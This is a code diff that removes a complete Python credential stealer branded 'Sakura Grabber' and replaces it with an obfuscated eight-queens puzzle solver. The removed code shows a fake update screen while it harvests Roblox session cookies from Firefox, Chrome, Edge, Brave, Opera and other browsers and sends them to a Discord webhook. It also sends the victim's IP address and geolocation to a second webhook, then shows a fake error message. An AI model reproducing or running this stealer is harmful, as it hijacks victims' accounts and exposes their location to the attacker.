@@ -1,146 +1,51 @@
-import os
-from dhooks import Webhook, Embed
-import socket
-import requests
-from tkinter import messagebox
-from base64 import b64decode
-from msvcrt import getch
-from tkinter import messagebox
-
-os.system("title Sakura Grabber")
-
-webhook = "Enter Webhook Here - Cookie Logger"
-webhook1 = Webhook('Enter Webhook Here - IP Logger')
-
-try:
-    import robloxpy
-    import requests
-    import browser_cookie3
-
-except:
-    input("One Of The Packages Are Not Installed, Run 'Requirements.Bat' To Remove This Error!")
-    exit()
-
-import time
-time.sleep(1.5)
-
-Sakura_message = "Checking For Updates..."
-print(Sakura_message)
-
-import time
-time.sleep(8.5)
-
-Sakura_message = "Error, Not On Latest Version!"
-print(Sakura_message)
-
-import time
-time.sleep(2.5)
-
-Sakura_message = "Installing..."
-print(Sakura_message)
-
-def cookiecheckerandsend(cookie, platform):
-
-    if not robloxpy.Utils.CheckCookie(cookie) == "This Is A Valid Cookie":
-        return requests.post(url=webhook, data={"content":f"\n|| ```{cookie}``` ||"})
-
-    info = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":cookie}).json()
-
-    requests.post(url=webhook, json={
-        'username': "Sakura",
-        'avatar_url': "https://cdn.discordapp.com/avatars/994230412383633480/1057a089f5141d9aac5848210c55212c.png?size=256",
-        'embeds': [{
-                "title": f"Sakura Grabber",
-                "fields": [
-                    {"name": ".ROBLOSECURITY", "value": f"```fix\n{cookie}```", "inline": True},
-                ],
-                "footer": {
-                    ""
-                }
-            }
-        ]
-    }
-)
-
-hostname = socket.gethostname() 
-ip = requests.get('https://api.ipify.org/').text 
-r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
-geo = r.json()
-embed = Embed()
-fields = [
-    {'name': 'IP Address', 'value': geo['query']},
-]
-for field in fields:
-    if field['value']:
-        embed.add_field(name=field['name'], value=field['value'], inline=True)
-webhook1.send(embed=embed)
-
-def Sakura():
-
-    try:
-        cookies = browser_cookie3.firefox(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Firefox')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.safari(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Safari')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.chromium(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Chromium')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.edge(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Microsoft Edge')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Opera GX')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.opera(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Opera')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.brave(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Brave')
-    except:
-        pass
-
-    try:
-        cookies = browser_cookie3.chrome(domain_name='roblox.com')
-        for cookie in cookies:
-            if cookie.name == '.ROBLOSECURITY':
-                cookiecheckerandsend(cookie.value, platform='Chrome')
-    except:
-        pass
-
-cookies = Sakura()
-
-messagebox.showerror("Error", "Unable to install latest version.")
+""#line:4
+__all__ =[]#line:6
+class OOOO0OO00OO0O000O :#line:8
+    ""#line:9
+    def __init__ (OO0000OO00OO0000O ,OOO0O0OOOO0O0OOOO ):#line:11
+        OO0000OO00OO0000O .__O0O00O000OOO000OO =OOO0O0OOOO0O0OOOO #line:13
+        OO0000OO00OO0000O .__OOOOOOOOO00O0000O =0 #line:14
+        OO0000OO00OO0000O .__OOO00O0OO00O00O0O ()#line:15
+    def __OOO00O0OO00O00O0O (OOO0000OOOOOO0OO0 ):#line:17
+        ""#line:18
+        O0OOO0OOOO0000000 =[-1 ]*OOO0000OOOOOO0OO0 .__O0O00O000OOO000OO #line:19
+        OOO0000OOOOOO0OO0 .__O0O00O0OO0O0OO0O0 (O0OOO0OOOO0000000 ,0 )#line:20
+        print ("Found",OOO0000OOOOOO0OO0 .__OOOOOOOOO00O0000O ,"solutions.")#line:21
+    def __O0O00O0OO0O0OO0O0 (O0O0O00O0OO0O00O0 ,O000OO0OOOO0O0000 ,O0OO0OOOO0OO0O00O ):#line:23
+        ""#line:28
+        if O0OO0OOOO0OO0O00O ==O0O0O00O0OO0O00O0 .__O0O00O000OOO000OO :#line:30
+            O0O0O00O0OO0O00O0 .__O00OOOO0OO0O0OO00 (O000OO0OOOO0O0000 )#line:31
+            O0O0O00O0OO0O00O0 .__OOOOOOOOO00O0000O +=1 #line:32
+        else :#line:33
+            for O00OOO0000O000OOO in range (O0O0O00O0OO0O00O0 .__O0O00O000OOO000OO ):#line:35
+                if O0O0O00O0OO0O00O0 .__OO0OOO0O000000OO0 (O000OO0OOOO0O0000 ,O0OO0OOOO0OO0O00O ,O00OOO0000O000OOO ):#line:37
+                    O000OO0OOOO0O0000 [O0OO0OOOO0OO0O00O ]=O00OOO0000O000OOO #line:38
+                    O0O0O00O0OO0O00O0 .__O0O00O0OO0O0OO0O0 (O000OO0OOOO0O0000 ,O0OO0OOOO0OO0O00O +1 )#line:39
+    def __OO0OOO0O000000OO0 (O0O0O000O00OO0OO0 ,O000OO0OOOO0000OO ,OOOOOOO00000OO0O0 ,O000OO0O0OO0O0O00 ):#line:42
+        ""#line:46
+        for O00O0OOOO000O0O0O in range (OOOOOOO00000OO0O0 ):#line:47
+            if O000OO0OOOO0000OO [O00O0OOOO000O0O0O ]==O000OO0O0OO0O0O00 or O000OO0OOOO0000OO [O00O0OOOO000O0O0O ]-O00O0OOOO000O0O0O ==O000OO0O0OO0O0O00 -OOOOOOO00000OO0O0 or O000OO0OOOO0000OO [O00O0OOOO000O0O0O ]+O00O0OOOO000O0O0O ==O000OO0O0OO0O0O00 +OOOOOOO00000OO0O0 :#line:50
+                return False #line:52
+        return True #line:53
+    def __O00OOOO0OO0O0OO00 (O0OOO00000OOOOOO0 ,OOO000000OO00OOOO ):#line:55
+        ""#line:56
+        for OO0O00OOOO0O0OO0O in range (O0OOO00000OOOOOO0 .__O0O00O000OOO000OO ):#line:57
+            O0O0OOOOO000000OO =""#line:58
+            for O0O0000O000OOO000 in range (O0OOO00000OOOOOO0 .__O0O00O000OOO000OO ):#line:59
+                if OOO000000OO00OOOO [OO0O00OOOO0O0OO0O ]==O0O0000O000OOO000 :#line:60
+                    O0O0OOOOO000000OO +="Q "#line:61
+                else :#line:62
+                    O0O0OOOOO000000OO +=". "#line:63
+            print (O0O0OOOOO000000OO )#line:64
+        print ("\n")#line:65
+    def __O000OO00000OOOOOO (OO0O0O00O00O0O00O ,OOO0000O000OOOOOO ):#line:67
+        ""#line:71
+        OO000O00OO0OO0OO0 =""#line:72
+        for O000O0O0O000OOO0O in range (OO0O0O00O00O0O00O .__O0O00O000OOO000OO ):#line:73
+            OO000O00OO0OO0OO0 +=str (OOO0000O000OOOOOO [O000O0O0O000OOO0O ])+" "#line:74
+        print (OO000O00OO0OO0OO0 )#line:75
+def OO0OO000O0OO0000O ():#line:77
+    ""#line:78
+    OOOO0OO00OO0O000O (8 )#line:79
+if __name__ =="__main__":#line:81
+    OO0OO000O0OO0000O ()#line:83
